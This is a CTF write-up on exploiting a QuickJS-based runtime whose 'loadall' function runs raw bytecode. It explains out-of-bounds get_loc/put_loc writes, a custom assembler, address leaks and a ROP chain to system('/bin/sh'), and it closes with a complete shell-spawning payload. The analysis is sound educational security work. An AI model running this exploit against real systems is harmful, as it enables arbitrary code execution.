## Context

This CTF challenge revolves around a custom JavaScript runtime based on [QuickJS](https://bellard.org/quickjs/), a fast, lightweight, open-source JavaScript engine written in C. The program takes the path to a JavaScript file as input and runs it. The goal is to craft a malicious JavaScript program that, when executed on the challenge server, reads a flag from disk and prints it. Note that this minimal runtime does not expose any standard file IO functions that would make this trivial. Instead, the challenge authors have made two special functions available to the JavaScript code: `print`, and `loadall`. The former is a standard logging function similar to JavaScript's native `console.log` function. The latter is much more interesting, as it takes a byte array as input and executes its content as a JavaScript function in QuickJS bytecode format.

Scripting languages like JavaScript are generally not compiled, and rely on a separate program (the interpreter) to execute the code. The interpreter could do this by reading the code line by line and executing it as it is parsed, but parsing is often a slow, complicated process and makes optimizations difficult. Instead, many interpreters rely on an intermediary bytecode that describes the operations performed by the script in a more computer-friendly format, without compiling it all the way to machine code. QuickJS is no exception to this, parsing each function into an internal bytecode representation before executing the program. This helps performance, and also allows the engine to deal with parsing and execution separately. 

### Reminder about JavaScript features

JavaScript as a language is much more flexible than traditional compiled languages like C. For example, it uses dynamic typing, meaning a variable can contain values of different types. It also allows nested functions and treats functions as [first class citizens](https://en.wikipedia.org/wiki/First-class_citizen), meaning they can be stored in variables themselves. QuickJS supports all of these features while trying to maintain good performance, which explains some of the design choices that its creator made.
### A quick look at QuickJS internals

A parsed QuickJS program is represented by the following:
- A list of atoms, which are effectively repeated strings that are replaced by integers in the bytecode for performance reasons. An atom can be both an identifier (like `print`) and a value (like `"Hello World"`)
- An entry function, called `<eval>` that wraps the entire program. This is the function that gets called when the program is executed

Each function is itself represented by the following:
- Metadata, like name argument count, maximal stack size, ...
- A list of local variables and their scope
- A list of closure variables, which are variables that hold functions themselves and their context (any variables or constant that are accessible from the function)
- A list of constants that are used within the code. These can contain both values and closures.
- Debug information (filename, line number, and a mapping from bytecode index to source code file line)
- The function's bytecode, which describes its logic

QuickJS bytecode follows a [stack machine](https://en.wikipedia.org/wiki/Stack_machine) design. Each operation sources its inputs by popping from the stack and pushes the result back onto the stack. This contrasts with most assembly languages (x86, MIPS) which typically read and write to registers. The bytecode is then effectively just a list of encoded operations. Each operation has an opcode (1 byte) and optionally one specified parameter, which is often the index of an atom, local variable, or constant.

QuickJS represents all values held by constants and variables in the JavaScript code as structs of type `JSValue`. These are simply composed of one generic 8 byte value that can hold a 32 bit integers, a 64 bit floating point value in [IEEE 754 encoding](https://en.wikipedia.org/wiki/Double-precision_floating-point_format) or a pointer, and a 64 bit integers that holds the type, or "tag" of the value. In C:

```c
typedef union JSValueUnion {
    int32_t int32;
    double float64;
    void *ptr;
} JSValueUnion;

typedef struct JSValue {
    JSValueUnion u;
    int64_t tag;
} JSValue;
```

> Note that QuickJS also supports an optimization known as [NaN-Boxing](https://piotrduperas.com/posts/nan-boxing) which hacks the IEEE 754 Floating point standard to store extra information inside a float's mantissa. When this is enabled, a JSValue only takes up 8 bytes instead of 16, but thankfully this optimization is disabled for this challenge. I just mention it because it's an interesting optimization technique, and a future challenge could build on this.

The `loadall` function exposed to the JavaScript code in this challenge takes a full program representation (atoms and entry function) as input and calls the entry function by executing its bytecode. Note that this function is not a native part of QuickJS, but was added by the challenge authors in the given code.
## Vulnerability

The vulnerability in this program is letting the user supply arbitrary bytecode to be executed. Although QuickJS was designed to be memory safe regardless of the nature of the JavaScript code, it makes the assumption that any executed bytecode is valid and that it follows certain constraints. This is because when used as intended, all executed bytecode is exclusively generated by the library itself, and not externally sourced. For this reason, certain operations can be hijacked to perform memory unsafe operations.

Most interestingly for this challenge are the `put_loc` and `get_loc`. These are intended to be used to set and get the value of local variables, taking the index of the local variable (from the list described earlier) as input. Internally, this indexes an array of JSValues by the supplied index. Since QuickJS assumes the bytecode follows certain rules, no sanity checks are performed on this index, and it can therefore be used to write or read a JSValue struct at an arbitrary location in memory.

## Exploit

### Theory

The prospect of being able to write to any memory location makes this challenge relatively straight forward at first glance. For example, we could overwrite a return address or [GOP](https://en.wikipedia.org/wiki/Global_Offset_Table) entry to point to the `system` or `execve` functions to start a shell, or build and execute a [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming)-chain. However, the main difficulty is that we can only write in multiples of 16 bytes and do not control the last 8 bytes which are tied to the tag. This tag depends on the type of the object. For example, if we write a float64, the tag is going to be 7 (`JS_TAG_FLOAT64`), and if we write an int, it's going to be 0 (`JS_TAG_INT`).

Let's illustrate all of this theory with a simple example. Let's say our array of local variables (known as `var_buf` in the code) starts at address `0x1000`. Each local variable is a `struct JSValue` of size 16 (`0x10`). This means that the `i`-th local variable is stored at `0x1000 + i * 0x10`. If we want to write the bytes `0x01 0x23 0x45 0x67 0x89 0xAB 0xCD 0xEF` at address `0x1050` we can set our custom bytecode to write the float `3.51270056408850369812238561681E-303` into the local variable with index 5. This float is chosen as its binary representation matches the bytes we picked. This will work, but it will have the side effect of writing the bytes `0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x07` at address `0x1058` directly after, since the tag of a float64 value is 7. The extra write in itself isn't too much of an issue, the real problem is that we have no way of writing arbitrary data to these 8 bytes, or any other odd-aligned word, as we can only move in multiples of 16 (the size of the JSValue struct).

In order to build a ROP-chain on the stack, we need to be able to overwrite a sequence of 8 byte words on the stack, not just even-aligned 8-byte words. Thankfully, we can use a clever technique to get around this.

Recall that the addresses of words we can overwrite depends on `var_buf`: 

`write_start = var_buf + i * sizeof(JSValue)`

If we can change the value of `var_buf`, we can offset our `write_start` to instead follow odd-aligned words, giving us write access to those parts of memory that we previously couldn't reach. Luckily for us, and probably in-part thanks to compiler alignment constraints, it just so happens that the address where `var_buf` is stored is a multiple of 16. Bingo! Now, if we want to write 2 consecutive words, we can do the following:

1. Write to the right local variable index to set the first 8 bytes in memory (this will also write the tag to the next 8 bytes)
2. Overwrite `var_buf` to offset the variable by 8 bytes
3. Write to the same local variable, which will now set the next 8 bytes in memory to an arbitrary value (and again write the tag right after)

The problem is that after overwriting `var_buf` to offset it by 8, it now becomes unreachable since it falls at a multiple of 16, and becomes aligned with the tag portion of the JSValue instead of the actual value that we control. This is a problem, because in order to write multiple consecutive words to the stack, we need to be able to alternate between writing even and odd aligned words. We can't just write all even aligned words in one batch and then all odd aligned words afterwards, since every write has the side effect of writing an extra word behind it. We need a way to reset `var_buf` after we offset it. And luckily, there is a (little convoluted) way of doing this. Remember when I said we don't control the tag? Well we actually can. If we use `get_loc` to read the value of a local variable, the tag of the returned JSValue is copied from memory, and that same tag is then going to be written when using `put_loc`. This means that we can use the tag to copy from one unaligned memory location to another, which will come in handy to reset the `var_buf` pointer back to its original value.
### The assembler

Even though we are attacking a JavaScript engine, we can't directly use JavaScript to write our exploit since the vulnerability we are exploiting is only available when working with raw bytecode. Since I didn't want to painstakingly hard code each opcode one by one, I wrote a simple assembler in python that takes a list of instructions and converts them into valid bytecode. It also allows me to specify certain constants to be included in the function's constant pool and lets me reference them in the code. For example, the following "assembly" code writes the word `0x00000000AABBCCDD` to `var_buf + 12 * 16`:

```
# @ means we are declaring a constant
# the f prefix tells our assembler to tag the constant as a float64
@flt_value f.7FFFF7C2A873

# Push the constant value
push_const8 flt_value

# Write it to local variable 12
put_loc 12
```

The assembler produces the following bytecode:
```
67,2,10,60,114,101,116,62,28,116,101,115,116,95,112,97,121,108,111,97,100,46,115,12,0,6,0,162,1,0,1,0,1,0,1,5,1,164,1,0,0,0,193,0,89,12,0,200,3,1,0,6,115,168,194,247,255,127,0,0
```

which we can use in the `loadall` instruction to run it.

The complete source code of the assembler can be found [here](assembler.py).
### Easy mode: No PIE, no ASLR

As a warmup, I compiled the challenge executable without position independent code and with ASLR disabled. This meant I could hard code memory addresses in the exploit.

My target was libc's `system` function, which I wanted to execute with `/bin/sh` as the argument to open a shell on the host machine. Since the challenge exposes the executable through an interactive wrapper script, this would allow me to explore the file system and retrieve the flag.

The executable is an ELF binary compiled for amd64 system, meaning it uses the System V calling convention, where the first argument is stored in the `rdi` register. So, our exploit needs to write the string `/bin/sh` into memory at a known location, then set `rdi` to point to that location and finally call `system`. Using [ropper](https://github.com/sashs/Ropper), I found a gadget in libc that pops the stack to `rdi` and then returns. 

We can now use our writing abilities to construct the following stack layout:

| Address                                      | value                            |
| -------------------------------------------- | -------------------------------- |
| Function return address location (`ret+0x0`) | Address of `pop rdi; ret` gadget |
| `ret+0x8`                                    | Address of `/bin/sh` string      |
| `ret+0x10`                                   | Address of `system`              |
Once the function returns, execution will jump to the gadget, which will load the string into `rdi`, and then return execution to `system`, bingo! 

...Except this doesn't work. Using IDA, I manually setup this layout, and although execution was passed to `system`, it eventually segfaulted. Why? Because `system` expects the stack pointer to be 16 byte aligned at the function's entry, which it normally would, but not after our stack corruption since we added an odd number of pops, causing the stack pointer to no longer be aligned. Luckily, I found another gadget that first pops into `rdi`, and then pops into `rbp` before returning. When `system` is called, it will reset `rbp` itself so it doesn't care about its value. This way, by using this new gadget, we can just place the address of `system` one word later in the stack, causing whatever garbage value is at location `ret+0x10` to be popped into `rbp` before passing execution to `system`, now with a correctly aligned `rsp`. 

Here is the new stack layout:

| Address                                      | value                                     |
| -------------------------------------------- | ----------------------------------------- |
| Function return address location (`ret+0x0`) | Address of `pop rdi; pop rbp; ret` gadget |
| `ret+0x8`                                    | Address of `/bin/sh` string               |
| `ret+0x10`                                   | \[Anything\]                              |
| `ret+0x18`                                   | Address of `system`                       |
And this time, when testing it in IDA, it actually works!

Now, let's build the payload to actually set up this stack layout.

```
# Hardcoded address constants, obtained by running the binary in IDA 
@flt_gadget_addr f.7FFFF7D0F75B
@flt_system_addr f.7FFFF7C58740
@flt_vb_offset_8 f.7FFFFFFFD738
@flt_bin_sh_addr f.7FFFFFFFDA20

# Encoded string '/bin/sh\0' (appears reversed because of little endian)
@flt_bin_sh_str  f.0068732F6E69622F

# Copy var_buf to safe location (7FFFFFFFD980) using get_loc and put_loc
get_loc 17
put_loc 37

# Offset var_buf by 8 to be able to write at odd-aligned addresses
push_const8 flt_vb_offset_8
put_loc 17

# Overwrite return address with gadget
push_const8 flt_gadget_addr
put_loc 33

# Reset var_buf
get_loc 36
# OG var_buf value is now in loc36 tag
put_loc 16

# Write "/bin/sh" to memory
push_const8 flt_bin_sh_str
put_loc 47

# Write address to stack
push_const8 flt_bin_sh_addr
put_loc 34

# Write system address
push_const8 flt_system_addr
put_loc 35

# Return value
undefined
return
```

I ran this step by step in the IDA debugger, and at first everything was going smoothly, with the stack layout being assembled as planned. However, when the exploit was complete, the program segfaulted before having time to hit the return instruction. I quickly realized that this was because QuickJS tries to dereference a `JSStackFrame` pointer stored right before `var_buf` in the function's stack, and this pointer gets clobbered as a side effect of resetting `var_buf`. I therefore added some code at the very end of the exploit code to fix the pointer, by setting it to the address of an empty `JSStackFrame` that is conveniently declared as a stack variable in this function. Just like resetting `var_buf` has the side effect of clobbering the stack frame pointer, writing to the stack frame pointer clobbers `var_buf`. Luckily, we don't need it anymore after that, so that side effect is not an issue for us.

```
@flt_gadget_addr f.7FFFF7C2A873
@flt_system_addr f.7FFFF7C58740
@flt_vb_offset_8 f.7FFFFFFFD738
@flt_bin_sh_addr f.7FFFFFFFDA20
@flt_bin_sh_str  f.0068732F6E69622F
@flt_sf_s_addr   f.7FFFFFFFE150

# Copy var_buf to safe location (7FFFFFFFD980) using get_loc and put_loc
get_loc 17
put_loc 37

# Offset var_buf by 8
push_const8 flt_vb_offset_8
put_loc 17

# Overwrite return address (7FFFFFFFD948) with gadget
push_const8 flt_gadget_addr
put_loc 33

# Reset var_buf
get_loc 36
# OG var_buf value is now in loc36 tag
put_loc 16

# Write "/bin/sh" to memory
push_const8 flt_bin_sh_str
put_loc 47

# Write address to stack
push_const8 flt_bin_sh_addr
put_loc 34

# Write system address
push_const8 flt_system_addr
put_loc 35

# Offset var_buf
push_const8 flt_vb_offset_8
put_loc 17

# Overwrite sf. This will clobber var_buf, so no more put_loc/get_loc after this!
push_const8 flt_sf_s_addr
put_loc 16

undefined
return
```

And this now works! If we load the assembled bytecode using the `loadall` function, a shell opens! Unfortunately, that's only half the story, now comes the tricky part, making this work with PIE and ASLR enabled.

### Hard mode: no hard-coded addresses

To make our exploit work on the challenge server, we need to find the memory addresses at runtime, since the loading address of the code and the imported libraries can vary between runs.

The idea is simple: we just need to find one known libc address, which will allow us to calculate the address of the gadget and of `system` by simple arithmetic (since the layout of libc is known). We also need to know where the stack is, to calculate the stack addresses we use in our exploit. For libc, we can simply read the `__libc_start_call_main` return address stored on the stack at a predictable location. To do this, we can first write the value 7 (for `JS_TAG_FLOAT64`) to the word immediately after, so `get_loc` will return a 64 bit float when using it to read this address. If we don't add this tag, the returned value will be of invalid type and we won't be able to perform arithmetic with it. For the stack address, we can just use the value of `var_buf`, which we already saved.

Turns out the main issue is not getting the address, but dealing with the floats. Addresses we read and write are simply floats to our bytecode, so doing the arithmetic is actually more difficult than you might expect. We can't simply add to the floats, as the produced binary representation will not be consistent. 

Using ChatGPT, I generated the following helper function in JavaScript:

```javascript
function float_add_raw(flt, val) {
    // Create an 8-byte buffer
    const view = new DataView(new ArrayBuffer(8));

    // Set float64 into buffer
    view.setFloat64(0, flt, true); // little-endian

    // Read raw bits as 64-bit unsigned integer using BigInt
    let raw = (BigInt(view.getUint32(4, true)) << 32n) | BigInt(view.getUint32(0, true));

    // Add signed val using BigInt
    raw += BigInt(val);

    // Write back into the buffer
    view.setUint32(0, Number(raw & 0xFFFFFFFFn), true);
    view.setUint32(4, Number((raw >> 32n) & 0xFFFFFFFFn), true);

    // Read and return the new float
    return view.getFloat64(0, true);
}
```

This function takes a float `flt` and adds the int `val` to its binary representation, which is going to allow us to offset addresses stored as floats. I then compiled this function to bytecode using QuickJS's `qjsc` utility and modified my assembler to inject the function bytecode into my compiled payload. In assembly, I can now call this function like this:
```
# Push the function to the JS Stack
fclosure8 float_add_raw

# Read a float from the process stack
get_loc 17

# Set our offset
push_i32 8

# Run the function
call2

# The result is now on the JS Stack
```

This led me to the following, mostly position independent payload assembly:

```
:stack_size 1

@flt_vb_offset_8 f.7FFFFFFFD738
@flt_bin_sh_str  f.0068732F6E69622F

# Tell the assembler to inject the function
@float_add_raw *

# Copy var_buf to safe location using get_loc and put_loc
get_loc 17
put_loc 37

# Offset var_buf by 8
push_const8 flt_vb_offset_8
put_loc 17

## Read var_buf value to get stack reference
# First mark it as a float by writing 7 right after it
push_7
put_loc 37

# Reset var_buf 
get_loc 36
# OG var_buf value is now in loc36 tag
put_loc 16

# Read float
get_loc 37

# Create a duplicate for later
dup

## Get heap address (__libc_start_call_main)
# First mark it as float
push_7
put_loc 226

# Offset var_buf by 8
push_const8 flt_vb_offset_8
put_loc 17

fclosure8 float_add_raw

# Read float
get_loc 225
swap
get_loc 225

# The JS Stack is now: stack address (x2), heap address, float_add_raw, heap address

# Compute gadget address
push_i32 1705
call2

# Overwrite return address with gadget
put_loc 33

swap

# JS Stack is now: stack address, heap address, stack address

# Reset var_buf
get_loc 36
put_loc 16

# Write "/bin/sh" to memory
push_const8 flt_bin_sh_str
put_loc 47

# Write address to stack by computing it from our known stack address
fclosure8 float_add_raw
swap
push_i32 752
call2
put_loc 34

## Write system address (compute from known heap address)
fclosure8 float_add_raw
swap
push_i32 189814
call2
put_loc 35

# Offset var_buf
push_const8 flt_vb_offset_8
put_loc 17

# Overwrite sf. This will clobber var_buf, so no more put_loc/get_loc after this!
fclosure8 float_add_raw
swap
push_i32 2592
call2
put_loc 16

undefined
return
```

Two things to note:
* I added a directive at the top to tell my assembler to fix the stack size to 1 to get a predictable layout. Without this, the stack size depends on the code, and different stack sizes lead to different stack locations for `var_buf[0]`.
* I used `swap` and `dup` instructions to juggle around the different addresses on the JS Stack without having to use local variables, since that would complicate the whole `get_loc` / `set_loc` logic.


As you can see, we have eliminated most hardcoded addresses in favor of dynamically computed ones. There remains one problem though: we are still using a hardcoded address to overwrite `var_buf` when offsetting it by 8 bytes. In theory, we just need to get a stack address, then use our `float_add_raw` function to construct the 8-offset `var_buf` address. The problem is that to use the function, the value needs to have a float tag, and we can't write the float tag to memory without first offsetting `var_buf` by 8, what a nightmare! 

What we need is a value already on the stack that satisfies the following conditions
- Be accessible via `get_loc` (i.e. 16-byte aligned, and constant offset from `var_buf[0]`)
- Has `0x8` as the lowest nibble 
- Point to a constant, predictable offset in the stack frame across runs (deterministic)

If we find such a value, we can read it and use it to offset `var_buf` instead of writing a hardcoded value.

After scrolling through the stack in IDA, I did find a couple of values that satisfied these conditions, but they all had one slightly annoying property in common: they all pointed to stack addresses greater than that of `var_buf`. This means that although we could use them offset `var_buf` by 8, `var_buf` would then fall out of scope for us once again and there would be no way to revert it back to its original address. I tried using negative local variable indices to see if I could get around this, but that did not work. I was stuck on this for a while, until I realized I don't actually need to reset `var_buf`.

The `var_buf` array is allocated on the stack inside the `JS_CallInternal` function. This function is called for every JS function that gets executed. This means that `var_bufs` are independent across functions, so if I offset `var_buf` in one function, and then return back to my main function, this offset will effectively be reversed. So, I created a simple function whose only job is to write a 7 right after a 16-aligned stack address to make it readable by the main function. This requires offsetting `var_buf`, which this function can comfortably do with the destructive technique since it will get destroyed once the function returns.

```
# get known stack address ending in 8
get_loc 26

# Wipe-out a specific address to avoid segfault
push_0
put_loc 78

# replace var_buf with the known stack address ending in 8
put_loc 18

# Mark a stack address saved on the stack as a float
push_7
put_loc 37

undefined
return
```

In case you are wondering, I'm not quite sure why writing zero to that specific address is necessary. Without it, I encountered a segmentation fault due to the code following a specific code path which dependent on this value being greater than a certain constant, and setting it to 0 skips that.

To include this custom bytecode function in my final payload, I modified my assembler to support including other files as functions. I could then call the custom function, which I called `stack_leak_prep`, and then read the marked float of the stack.

If you're lost at this point, remember we're trying to read a stack address from the stack to be able to calculate the 8-offset replacement of `var_buf`, which we can only do if a 7 immediately follows the value on the stack (since that's how we can read it as a float, which we can manipulate in the code).

My main assembly now looks like this:
```
:stack_size 1

@flt_bin_sh_str  f.0068732F6E69622F

# The asterisk refers to the hardcoded bytecode of the function. The file name
# in angle brackets tells the assembler to read that file and assemble it.
@float_add_raw *
@stack_leak_prep <stack_leak_prep.s>

# Mark stack address as float using helper function
fclosure8 stack_leak_prep
call0
drop

# Compute offset var_buf address from prepared float + offset
fclosure8 float_add_raw
get_loc 25
push_i32 -384
call2

# Store at safe location for later
put_loc 39

# Copy var_buf to safe location
get_loc 17
put_loc 37

# Offset var_buf by 8
get_loc 39
put_loc 17

## Read var_buf value to get stack reference
# First mark it as a float by writing 7 right after it
push_7
put_loc 37

# Reset var_buf 
get_loc 36
# OG var_buf value is now in loc36 tag
put_loc 16

# Read float
get_loc 37

# Create a duplicate for later
dup

## Get heap address (__libc_start_call_main)
# First mark it as float
push_7
put_loc 226

# Offset var_buf by 8
get_loc 39
put_loc 17

fclosure8 float_add_raw

# Read float
get_loc 225
swap
get_loc 225

# The JS Stack is now: stack address (x2), heap address, float_add_raw, heap address

# Compute gadget address
push_i32 1705
call2

# Overwrite return address with gadget
put_loc 33

swap

# JS Stack is now: stack address, heap address, stack address

# Reset var_buf
get_loc 36
put_loc 16

# Write "/bin/sh" to memory
push_const8 flt_bin_sh_str
put_loc 47

# Write address to stack by computing it from our known stack address
fclosure8 float_add_raw
swap
push_i32 752
call2
put_loc 34

## Write system address (compute from known heap address)
fclosure8 float_add_raw
swap
push_i32 189814
call2
put_loc 35

# Offset var_buf by 8
get_loc 39
put_loc 17

# Overwrite sf. This will clobber var_buf, so no more put_loc/get_loc after this!
fclosure8 float_add_raw
swap
push_i32 2592
call2
put_loc 16

undefined
return
```

The code is now fully position independent, as you can see by the lack of hard-coded addresses, and running it correctly opens a shell that we can use to retrieve the flag!

The exact JavaScript code we can use to gain shell access looks as follows:
```
loadall((new Uint8Array([67,15,26,102,108,111,97,116,95,97,100,100,95,114,97,119,6,102,108,116,6,118,97,108,8,118,105,101,119,20,115,101,116,70,108,111,97,116,54,52,18,103,101,116,85,105,110,116,51,50,18,115,101,116,85,105,110,116,51,50,20,103,101,116,70,108,111,97,116,54,52,28,115,116,97,99,107,108,101,97,107,95,112,114,101,112,10,112,114,105,110,116,30,115,116,97,99,107,95,108,101,97,107,95,112,114,101,112,10,60,114,101,116,62,34,115,116,97,99,107,95,108,101,97,107,95,112,114,101,112,46,115,10,60,114,101,116,62,18,112,97,121,108,111,97,100,46,115,12,0,6,0,162,1,0,1,0,1,0,3,128,1,1,164,1,0,0,0,194,2,240,14,194,1,88,25,0,1,128,254,255,255,242,89,39,0,88,17,0,89,37,0,88,39,0,89,17,0,190,89,37,0,88,36,0,89,16,0,88,37,0,17,190,89,226,0,88,39,0,89,17,0,194,1,88,225,0,27,88,225,0,1,169,6,0,0,242,89,33,0,27,88,36,0,89,16,0,193,0,89,47,0,194,1,27,1,240,2,0,0,242,89,34,0,194,1,27,1,118,229,2,0,242,89,35,0,88,39,0,89,17,0,194,1,27,1,32,10,0,0,242,89,16,0,6,40,226,3,1,0,6,47,98,105,110,47,115,104,0,12,67,6,0,198,3,2,2,2,6,0,4,169,1,4,200,3,0,1,0,202,3,0,1,0,204,3,1,0,48,226,1,1,1,32,97,1,0,97,0,0,56,179,0,0,0,17,56,166,0,0,0,17,191,8,33,1,0,33,1,0,203,98,0,0,66,231,0,0,0,183,211,10,36,3,0,14,56,180,0,0,0,98,0,0,66,232,0,0,0,187,10,36,2,0,241,193,0,161,56,180,0,0,0,98,0,0,66,232,0,0,0,183,10,36,2,0,241,176,204,98,1,0,56,180,0,0,0,212,241,158,17,99,1,0,14,98,0,0,66,233,0,0,0,183,56,154,0,0,0,98,1,0,193,1,174,241,10,36,3,0,14,98,0,0,66,233,0,0,0,187,56,154,0,0,0,98,1,0,193,2,162,193,3,174,241,10,36,3,0,14,98,0,0,66,234,0,0,0,183,10,37,2,0,202,3,1,7,34,110,80,220,85,133,150,10,36,1,128,10,140,1,4,255,255,255,255,10,36,1,128,10,140,1,4,255,255,255,255,12,0,6,0,218,3,0,1,0,2,0,0,16,1,164,1,0,0,0,88,26,0,183,89,78,0,89,18,0,190,89,37,0,6,40,222,3,1,0])).buffer);
```
## Remediation

QuickJS's bytecode interpreter was not designed to safely deal with arbitrary input. It was designed to only handle bytecode generated by the library itself, and as such, it should not be exposed to the user. Although this particular vulnerability could be fixed by adding bound checks to `get_loc` and `put_loc`, it is likely that some other exploit will still be possible. For the `loadall` instruction to exist safely, the developers would need to make substantial changes to QuickJS's internals and conduct extensive testing to make the interpreter safe.

## Closing thoughts

This challenge was intended to be solvable in three days, but took me around three weeks to solve myself. I have immense respect for the few teams that did solve it in time, and I would like to thank KalmarCTF Discord member `white701` for outlining the steps he took to come up with his solution, which really helped me get started, and for answering my questions when I got stuck. 

Looking at the posted solutions, it looks like other teams used a hybrid JavaScript/bytecode approach where only some actions used custom-crafted bytecode with the `loadall` instruction, and the rest of the exploit was kept in JavaScript. In retrospect, I should probably have followed that approach as well, which may have eliminated the need to write a full blown multi-file assembler for an undocumented instruction set used by only one specific JavaScript engine. That being said, I recognized many of the patterns I came up with in other solutions, so I don't think my actual exploit strategy ended up being that much more complicated compared to others.

This was my first ROP exploit and I had an absolute blast. I love diving into rabbit holes like this one, study up on a very niche topic and developing my own tools, until everything eventually comes together at the end. I also learned a ton of skills that I know will transfer to completely unrelated challenges, and I am now more motivated than ever to take up more binary exploitation challenges.